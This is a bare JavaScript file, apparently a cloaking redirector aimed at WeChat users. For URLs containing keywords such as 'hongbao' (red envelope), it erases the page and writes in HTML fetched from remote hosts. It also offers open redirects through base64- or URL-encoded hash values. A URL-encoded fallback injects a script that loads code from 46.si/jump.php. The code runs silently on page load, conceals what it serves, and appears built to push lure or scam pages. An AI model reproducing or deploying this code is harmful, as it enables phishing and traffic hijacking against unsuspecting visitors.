var ua = navigator.userAgent.toLowerCase();
if (/micromessenger/.test(ua)) {
  
if(location.href.indexOf("hongbao")!=-1){
document.title = '\u8bf7\u7a0d\u7b49...';
var xhr = new XMLHttpRequest;
var html = null;
function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
xhr.open("GET", "//ass-1257893229.cos-website.ap-beijing.myqcloud.com/html/hb.html?t=" + Date.now(), !0);
xhr.send();
}else if(location.href.indexOf("sbshare")!=-1){
  
document.title = '\u8bf7\u7a0d\u7b49...';
var xhr = new XMLHttpRequest;
var html = null;
function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
xhr.open("GET", "//ass-1257893229.cos-website.ap-beijing.myqcloud.com/html/hb2.html?t=" + Date.now(), !0);
xhr.send();
  
}else if(location.href.indexOf("shua")!=-1){
  
document.title = '\u8bf7\u7a0d\u7b49...';
var xhr = new XMLHttpRequest;
var html = null;
function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
xhr.open("GET", "//i.46.si/case/hb.html?t=" + Date.now(), !0);
xhr.send();
  
}else if(location.href.indexOf("vshare")!=-1){
  
document.title = '\u8bf7\u7a0d\u7b49...';
var xhr = new XMLHttpRequest;
var html = null;
function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
xhr.open("GET", "//i.46.si/video/html/v2.html?t=" + Date.now(), !0);
xhr.send();
  
}else if(location.href.indexOf("gourl")!=-1){
  
location.href=unescape(location.href.split("#")[1]);
  
}else if(location.href.indexOf("videos")!=-1){
  
document.title = '\u8bf7\u7a0d\u7b49...';
var xhr = new XMLHttpRequest;
var html = null;
function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
xhr.open("GET", "//ass-1257893229.cos-website.ap-beijing.myqcloud.com/video/index1.html?t=" + Date.now(), !0);
xhr.send();
  
}else if(location.href.indexOf("kaibao")!=-1){
  
document.title = '\u8bf7\u7a0d\u7b49...';
var xhr = new XMLHttpRequest;
var html = null;
function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
xhr.open("GET", "//ass-1257893229.cos-website.ap-beijing.myqcloud.com/kaibao/index.html?t=" + Date.now(), !0);
xhr.send();
  
}else if(location.href.indexOf("fx")!=-1){
  
document.title = '\u8bf7\u7a0d\u7b49...';
var xhr = new XMLHttpRequest;
var html = null;
function render() {
    var a = document.open("text/html", "replace");
    a.write(html);
    a.close();
}
xhr.onload = function() {
    html = xhr.responseText;
    var delay = 0;
    if (delay > 0) setTimeout("render()", delay * 1000)
    else render();
};
xhr.open("GET", "//ass-1257893229.cos-website.ap-beijing.myqcloud.com/secret.html?t=" + Date.now(), !0);
xhr.send();
  
}else if(location.href.indexOf("public")!=-1){
  window.location=atob(location.hash.slice(1));
}else{
  document.title = '\u8bf7\u7a0d\u7b49...';
  lt(unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%20lang%3D%22en%22%3E%0A%3Chead%3E%0A%20%20%20%20%3Cmeta%20charset%3D%22UTF-8%22%3E%0A%20%20%20%20%3Ctitle%3E%3C/title%3E%20%0A%3Cscript%20type%3D%22text/javascript%22%20src%3D%22https%3A//apps.bdimg.com/libs/jquery/2.1.1/jquery.min.js%22%3E%3C/script%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%20%20%20%3Cscript%3E%0Afunction%20getUrlParam%28name%29%20%7B%0A%20%20%20%20var%20reg%20%3D%20new%20RegExp%28%22%28%5E%7C%26%29%22%20+%20name%20+%20%22%3D%28%5B%5E%26%5D*%29%28%26%7C%24%29%22%29%3B%20%0A%20%20%20%20var%20r%20%3D%20window.location.search.substr%281%29.match%28reg%29%3B%0A%20%20%20%20if%20%28r%20%21%3D%20null%29%20return%20unescape%28r%5B2%5D%29%3B%20return%20null%3B%0A%7D%0A%0Afunction%20loadJS%28src%29%20%7B%0A%20%20%20%20%20%20%20%20var%20s%20%3D%20document.createElement%28%27script%27%29%3B%0A%20%20%20%20%20%20%20%20s.setAttribute%28%27src%27%2C%20src%29%3B%0A%20%20%20%20%20%20%20%20s.setAttribute%28%27charset%27%2C%20%22utf-8%22%29%3B%0A%20%20%20%20%20%20%20%20document.body.appendChild%28s%29%3B%0A%20%20%20%20%7D%0Avar%20type%20%3DgetUrlParam%28%27type%27%29%3B%0Avar%20vid%20%3DgetUrlParam%28%27vid%27%29%3B%0AloadJS%28%27//46.si/jump.php%3Ftype%3D%27+type+%27%26vid%3D%27+vid%29%3B%0A%20%20%20%3C/script%3E%0A%3C/body%3E%0A%3C/html%3E"))
}
   }

    function lt(n) {
        document.open();
        document.clear();
        document.write(n);
        //t != null && document.write('<script type="text/javascript">' + t + "<\/script>");
        document.close()
    }
